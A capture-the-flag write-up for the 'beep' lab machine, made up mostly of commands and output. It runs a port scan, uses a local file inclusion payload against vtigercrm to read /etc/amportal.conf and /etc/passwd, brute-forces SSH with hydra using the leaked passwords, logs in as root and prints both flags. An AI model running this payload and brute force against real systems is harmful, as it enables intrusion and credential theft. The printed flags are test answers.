# beep

### there are several ports open and many routes to proceed with an attack
```
Discovered open port 22/tcp on 10.10.10.7
Discovered open port 80/tcp on 10.10.10.7
Discovered open port 110/tcp on 10.10.10.7
Discovered open port 993/tcp on 10.10.10.7
Discovered open port 443/tcp on 10.10.10.7
Discovered open port 25/tcp on 10.10.10.7
Discovered open port 3306/tcp on 10.10.10.7
Discovered open port 111/tcp on 10.10.10.7
Discovered open port 995/tcp on 10.10.10.7
Discovered open port 143/tcp on 10.10.10.7
Discovered open port 4445/tcp on 10.10.10.7
Discovered open port 10000/tcp on 10.10.10.7
```

### at 10.10.10.7:80 there's a login page for an elastix service
```
using  searchsploit to look for it we find an exploit for LFI
php/webapps/37637.pl
```


### with the following payload
```
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```
###### this payload lead us to something that looks like user passwds
```
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
#FOPPASSWORD=passw0rd
```

### modifying the payload we get the passwd file, removing from it uninteresting answers we have a list of users
```
root:x:0:0:root:/root:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
spamfilter:x:500:500::/home/spamfilter:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash
```

### with both a list of users and passwds, we can use hydra to bruteforce ssh
```
hydra -L users -P passwds ssh://10.10.10.7
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries (l:6/p:11), ~5 tries per task
[DATA] attacking ssh://10.10.10.7:22/
[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
1 of 1 target successfully completed, 2 valid passwords found
```
### and just like that, we have root access to the machine
```
there's a need to deal with a cipher when login in, so when trying to ssh you should first specify the encryption type
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@10.10.10.7
```

```
The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
root@10.10.10.7's password:
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# cd /root
[root@beep ~]# ls
anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
[root@beep ~]# cat root.txt
0b15df1a17494f0dd88edbf16f85ff35
[root@beep ~]# cat $(find / -type f -name "user.txt" 2>/dev/null)
b70141eb0ced632be801780cd9151d40
```
